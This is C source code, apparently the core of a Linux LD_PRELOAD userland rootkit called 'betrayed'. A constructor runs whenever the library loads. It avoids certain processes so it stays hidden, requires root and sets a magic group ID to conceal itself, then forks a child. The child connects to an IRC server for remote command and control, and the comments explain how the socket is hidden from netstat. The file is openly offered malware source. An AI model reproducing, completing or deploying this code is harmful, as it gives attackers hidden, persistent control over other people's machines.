#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <errno.h>
#include <dlfcn.h>
#include <termio.h>
#include <dirent.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <limits.h>
#include <fnmatch.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <linux/netlink.h>

#include "betrayed.h"
#include "config.h"
#include "utils.c"
#include "hooks.c"

void __attribute ((constructor)) binit (void)
{
    /* don't try to fork if we've already got an instance running.
     * that would be bad news. i was doing this check in the fork,
     * and killing ourselves if there was an instance already, but
     * i realised that was silly. */
    if(is_betrayed_alive()) return;

    /* we specifically need to not fork off of some processes in order
     * to stay hidden. */
    int i;
    for(i=0; i<sizeof(bad_bins)/sizeof(bad_bins[0]); i++) if(is_bad_proc(cprocname(),bad_bins[i])) return;

    /* in case you don't care about being root/hiding the process...
     * i was also doing this check once the process had been forked,
     * but nonono. that's also silly! */
    #ifndef SET_NOGID
    if(getuid() != 0) exit(0);
    (void) setgid(MGID); // we root, we hide.
    #endif

    int pid=fork();
    if(pid==0){

        setpgrp(); // we our own being
        
        /* make socket, connect to socket. exit(0) if we can't connect.
         * every new process will attempt to connect until a successful
         * connection is made.
         */
        sockfd=setup_connection();

        /* setup our signal handler so that we can close the socket to
         * the irc server should our process get terminated. (by us)
         * our function 'kill_rk_procs' sends SIGTERM to all rootkit
         * processes should we need to hide our presence.
         *
         * this is mainly so that we can hide the existence of the socket
         * from tools like netstat. there is a 3 second delay in when the
         * user runs netstat, and any output shows up. i needed to add this
         * so that the socket can fully disappear from the system. */
        signal(SIGTERM,(sighandler_t)commit_termicide);

        /* we out here parsing */
        betrayer(sockfd);
    }
}
